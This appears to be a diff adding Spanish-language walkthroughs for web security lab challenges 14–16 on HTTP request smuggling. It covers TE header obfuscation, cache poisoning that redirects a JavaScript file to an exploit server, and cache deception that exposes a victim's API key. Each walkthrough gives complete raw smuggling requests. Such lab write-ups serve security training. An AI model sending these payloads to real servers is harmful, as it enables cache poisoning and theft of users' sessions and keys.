@@ -281,3 +281,91 @@ Content-Length: 20
 test=test
 0
 ```
+
+## Reto 14: Contrabando de solicitudes HTTP, ofuscación del encabezado TE
+
+Este laboratorio utiliza un servidor front-end y uno back-end, y ambos gestionan las cabeceras de solicitud HTTP duplicadas de forma diferente. El servidor front-end rechaza las solicitudes que no utilizan los métodos GET o POST.
+
+Para resolver el laboratorio, envíe de contrabando una solicitud al servidor back-end, de modo que la siguiente solicitud procesada por el servidor back-end parezca utilizar el método GPOST.
+
+
+```
+POST / HTTP/1.1
+Host: 0a35004903426a3c807267b5002e003a.web-security-academy.net
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: invalido
+72
+GPOST / HTTP/1.1
+Host: 0a35004903426a3c807267b5002e003a.web-security-academy.net
+Content-Length: 20
+test=test
+0
+```
+
+## Reto 15: Explotación del contrabando de solicitudes HTTP para envenenar la caché web
+
+
+Este laboratorio utiliza un servidor front-end y uno back-end, y el servidor front-end no admite la codificación fragmentada. El servidor front-end está configurado para almacenar en caché ciertas respuestas.
+
+Para resolver el laboratorio, realice un ataque de contrabando de solicitudes que envenene la caché, de modo que una solicitud posterior de un archivo JavaScript reciba una redirección al servidor del exploit. La caché envenenada debería alertar document.cookie. 
+
+Este ataque avanzado de HTTP request smuggling para lograr un web cache poisoning. Usamos la diferencia de interpretación entre el front-end y el back-end para inyectar una redirección maliciosa en la caché del servidor. Al lograr que el fichero JavaScript ‘tracking.js‘ apunte al exploit server, conseguimos que el navegador de la víctima cargue un payload con ‘alert(document.cookie)‘
+
+```
+POST / HTTP/1.1
+Host: 0a0d00c00308cf94805e2bcc006500d8.web-security-academy.net
+Content-Length: 137
+Transfer-Encoding: chunked
+0
+GET /post/next?postId=3 HTTP/1.1
+Host: exploit-0a3800af0322cf1580752a61017d008c.exploit-server.net
+Content-Length: 20
+test=test
+```
+
+## Reto 16:Exploiting HTTP request smuggling to perform web cache deception
+
+Explotación del contrabando de solicitudes HTTP para engañar a los usuarios de la caché web
+
+Este laboratorio utiliza un servidor front-end y uno back-end, y el servidor front-end no admite la codificación fragmentada. El servidor front-end almacena en caché recursos estáticos.
+
+Para resolver el laboratorio, realice un ataque de contrabando de solicitudes para que la siguiente solicitud del usuario guarde su clave API en la caché. A continuación, recupere la clave API del usuario víctima de la caché y envíela como solución del laboratorio. Deberá esperar 30 segundos desde el acceso al laboratorio antes de intentar engañar a la víctima para que guarde su clave API en caché.
+
+Puede iniciar sesión en su propia cuenta utilizando las siguientes credenciales: wiener:peter 
+
+Este ataque avanzado de web cache deception combinado con HTTP request smuggling. Manipulamos una petición para hacer que la solicitud de /my-account del usuario víctima quede almacenada en la caché del servidor, exponiendo así su API Key.
+
+Una vez envenenada la caché, accedemos al contenido como si fuera un recurso estático.
+
+
+Petición con la Request Smuggling
+```
+POST / HTTP/1.1
+Host: 0a880065036c4b5a802b713f0032004a.web-security-academy.net
+Content-Length: 38
+Transfer-Encoding: chunked
+0
+GET /my-account HTTP/1.1
+Test: A
+```
+
+```
+GET /resources/js/tracking.js HTTP/1.1
+Host: 0a880065036c4b5a802b713f0032004a.web-security-academy.net
+Cookie: session=uVw3TnVPPfyNhD6k2rKE4xpzTAPe94aW
+Cache-Control: max-age=0
+Sec-Ch-Ua: 
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: ""
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0a880065036c4b5a802b713f0032004a.web-security-academy.net/my-account?id=wiener
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+```
